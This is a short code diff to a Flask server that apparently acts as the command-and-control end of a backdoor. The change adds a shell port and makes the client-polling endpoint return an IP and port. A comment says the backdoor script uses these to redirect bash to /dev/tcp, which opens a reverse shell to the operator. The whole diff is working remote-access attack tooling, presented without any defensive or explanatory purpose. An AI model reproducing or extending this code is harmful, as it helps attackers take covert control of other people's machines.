@@ -6,6 +6,7 @@ DEBUG = False
 SERVER_IP = "192.168.1.40"
 SERVER_PORT = 12345
 SHELL_IP = "192.168.1.40"#"127.0.0.1"
+SHELL_PORT = 12348
 
 app = Flask(__name__)
 
@@ -123,7 +124,8 @@ def update():
         ClientDatas[c_id] = c
     
     ClientDatas[c_id].update_time()
-    content = SHELL_IP if ClientDatas[c_id].shell_pending else "0"
+    # if shell, returns IP/PORT so backdoor script redirects bash to /dev/tcp/IP/PORT
+    content = SHELL_IP + "/" + str(SHELL_PORT) if ClientDatas[c_id].shell_pending else "0"
     ClientDatas[c_id].shell_pending = False
     return content
 
